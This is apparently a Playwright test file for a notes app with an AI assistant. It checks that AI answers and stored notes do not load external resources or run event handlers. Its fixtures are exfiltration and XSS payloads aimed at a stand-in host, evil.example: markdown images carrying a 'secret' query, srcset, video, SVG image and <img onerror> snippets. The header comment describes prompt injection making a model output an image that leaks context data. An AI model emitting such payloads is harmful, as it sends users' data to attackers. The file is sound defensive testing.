import { test, expect, openApp } from './fixtures';

// Ничего наружу без спроса: ответ ИИ и открытая заметка не запрашивают чужие
// адреса сами. Аудит путей данных 25.09 (TASKS.md, задача 33): картинка в
// ответе модели после внедрённой инструкции вынесла бы данные из контекста в
// адресе запроса, а заметка из подложенного файла копии исполняла <img onerror>.
const EVIL = 'https://evil.example/';

test('ответ ИИ: ни картинок, ни медиа, ни SVG с внешним адресом; ссылка — без Referer', async ({ page }) => {
  await openApp(page, '/');
  const out = await page.evaluate(async (evil) => {
    const { renderMarkdown } = await import('/src/features/ai/renderMarkdown.ts');
    const html = renderMarkdown(
      [
        `![x](${evil}img?d=secret)`,
        `<img srcset="${evil}srcset 1x">`,
        `<video poster="${evil}poster" src="${evil}v"></video>`,
        `<audio src="${evil}a"></audio>`,
        `<picture><source srcset="${evil}pic"></picture>`,
        `<svg><image href="${evil}svg"></image></svg>`,
        `<table background="${evil}bg"><tr><td>т</td></tr></table>`,
        `<p title="<a onclick=alert(1) z">абзац</p>`,
        `[ссылка](https://example.org/)`,
      ].join('\n\n'),
    );
    // Разбираем как DOM: подстрока «onclick» в безопасном тексте title — не атрибут.
    const box = document.createElement('div');
    box.innerHTML = html;
    const urls = [...box.querySelectorAll('*')].flatMap((el) =>
      [...el.attributes].filter((a) => a.name !== 'title').map((a) => a.value),
    );
    const a = box.querySelector('a');
    return {
      external: urls.filter((u) => u.includes('evil.example')),
      handlers: box.querySelectorAll('[onclick]').length,
      text: box.textContent,
      link: a && { href: a.getAttribute('href'), rel: a.getAttribute('rel'), target: a.getAttribute('target') },
    };
  }, EVIL);
  expect(out.external).toEqual([]);
  expect(out.handlers).toBe(0);
  expect(out.text).toContain('абзац');
  expect(out.link).toEqual({ href: 'https://example.org/', rel: 'noopener noreferrer', target: '_blank' });
});

test('заметка с внешней картинкой и onerror открывается без запроса наружу и без исполнения', async ({ page }) => {
  const hits: string[] = [];
  await page.route('https://evil.example/**', (r) => {
    hits.push(r.request().url());
    return r.abort();
  });
  await openApp(page, '/');
  await page.evaluate(async (evil) => {
    const { db } = await import('/src/db/db.ts');
    const ts = new Date().toISOString();
    await db.notes.put({
      id: 'n-evil', title: 'Заметка', createdAt: ts, updatedAt: ts, deletedAt: null, tags: [], pinned: false,
      content: `<p>Заметка</p><img src="${evil}px" onerror="window.__pwned=1"><img src="x" onerror="window.__pwned=2">`,
    } as never);
  }, EVIL);
  await page.goto('/notes/n-evil');
  await expect(page.locator('.note-editor')).toContainText('Заметка');
  await page.waitForTimeout(300);
  expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned)).toBeUndefined();
  expect(await page.locator('.note-editor img').count()).toBe(0);
  expect(hits).toEqual([]);
});
